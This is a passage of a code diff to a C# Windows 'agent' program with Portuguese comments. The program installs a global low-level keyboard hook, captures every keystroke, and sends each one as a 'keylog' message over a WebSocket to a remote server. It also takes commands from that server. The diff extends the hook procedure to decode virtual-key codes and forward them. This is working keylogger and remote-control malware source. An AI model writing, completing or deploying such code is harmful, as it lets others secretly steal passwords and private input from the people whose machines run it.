@@ -20,9 +20,7 @@ internal static class Program
     [STAThread] 
     static void Main() 
     { 
-        // Inicia a engine e mantém o processo vivo
         _ = StartEngine(); 
-        // Application.Run é essencial para o Hook de teclado funcionar corretamente
         Application.Run(); 
     }
 
@@ -42,7 +40,6 @@ internal static class Program
 
         Console.WriteLine($"[INFO] Iniciando Agente... ID: {agentId}");
 
-        // Instalação do Hook de Teclado
         KeyboardHook.Install(async (k, d) => {
             if (state.Socket?.State == WebSocketState.Open) {
                 await SendKeylog(state.Socket, sendGate, k, d);
@@ -79,16 +76,13 @@ internal static class Program
 
     static async Task SendKeylog(ClientWebSocket s, SemaphoreSlim g, string k, bool d) {
         try { 
-            // DEBUG: Isso vai aparecer no seu Visual Studio
             Console.WriteLine($"[DEBUG KEY] Tecla: {k} | Down: {d}"); 
-
             var payload = new { 
                 type = "keylog", 
                 key = k, 
                 down = d, 
                 ts = DateTime.UtcNow.ToString("HH:mm:ss") 
             };
-
             await SendJsonAsync(s, g, payload); 
             Console.WriteLine($"[DEBUG KEY] Enviado para o servidor: {k}");
         } catch (Exception ex) { 
@@ -115,7 +109,6 @@ internal static class Program
                 if (!root.TryGetProperty("type", out var tp)) continue;
                 var type = tp.GetString();
 
-                // Log de comandos recebidos do servidor
                 Console.WriteLine($"[INFO] Comando recebido do servidor: {type}");
 
                 switch (type) {
@@ -267,11 +260,23 @@ public class KeyboardHook {
     [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string n);
     private const int WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
     private static IntPtr _h = IntPtr.Zero; private static LowLevelKeyboardProc? _p; private static Func<string, bool, Task>? _cb;
-    public static void Install(Func<string, bool, Task> callback) { _cb = callback; _p = Proc; _h = SetHook(_p); }
+
+    public static void Install(Func<string, bool, Task> callback) { 
+        _cb = callback; 
+        _p = Proc; 
+        _h = SetHook(_p); 
+    }
+
     private static IntPtr SetHook(LowLevelKeyboardProc p) {
         using var cp = System.Diagnostics.Process.GetCurrentProcess();
         using var cm = cp.MainModule;
         return SetWindowsHookEx(WH_KEYBOARD_LL, p, GetModuleHandle(cm?.ModuleName), 0);
     }
+
     private static IntPtr Proc(int n, IntPtr w, IntPtr l) {
-        if (n >= 0 && _cb != null)
+        if (n >= 0 && _cb != null) {
+            int vkCode = Marshal.ReadInt32(l);
+            string key = ((Keys)vkCode).ToString();
+            Task.Run(async () => {
+                try { await _cb(key, true); } catch { }
+            });
